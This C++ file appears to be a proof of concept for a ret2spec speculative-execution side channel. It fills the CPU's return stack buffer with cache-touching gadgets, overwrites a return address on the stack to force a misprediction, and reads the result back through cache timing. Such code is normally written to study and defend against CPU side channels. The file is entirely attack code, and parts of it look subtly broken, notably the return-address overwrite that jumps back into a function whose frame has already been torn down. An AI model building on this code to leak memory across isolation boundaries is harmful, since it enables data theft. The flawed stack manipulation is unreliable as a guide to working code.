#include <array>
#include <cstring>
#include <iostream>
#include <vector>
#include <x86intrin.h>

#include "cache_sidechannel.h"
#include "instr.h"
#include "ret2spec_common.h"
#include "utils.h"

constexpr size_t kRSBDepth = 40;
constexpr size_t kPageSize = 4096;

alignas(4096) uint8_t probe_array[kRSBDepth * kPageSize];

// DC-gadget: Touches a unique cache line
__attribute__((noinline)) void DCGadget(size_t i) {
  volatile uint8_t val = probe_array[i * kPageSize];
  (void)val;
}

// This is the return target that speculatively executes the DCGadget
__attribute__((noinline)) void CallGadget(size_t i) {
  DCGadget(i);
}

// Fills the RSB with calls to DC-gadgets
void FillRSB() {
  for (size_t i = 0; i < kRSBDepth; ++i) {
    CallGadget(i);
  }
}

// Flushes entire probe array to eliminate prior cache state
void FlushProbeArray() {
  for (size_t i = 0; i < kRSBDepth; ++i) {
    FlushFromDataCache(&probe_array[i * kPageSize], &probe_array[i * kPageSize + 64]);
  }
}

// Indirect return to trigger RSB prediction without executing real DCGadget
__attribute__((noinline)) void MispredictReturnSite() {
  // Overwrite return address on the stack to skip DCGadget
  uint64_t *ret_addr = (uint64_t *)__builtin_frame_address(0) + 1;
  *ret_addr = (uint64_t)&&skip;

  // Return — will speculatively go to RSB top
  return;

skip:
  asm volatile("" ::: "memory");
}

// Returns the observed RSB entry (if any) based on cache timing
int DetectRSBHit() {
  for (size_t i = 0; i < kRSBDepth; ++i) {
    if (ReloadAccess(&probe_array[i * kPageSize])) {
      return i;
    }
  }
  return -1;  // No speculative hit
}
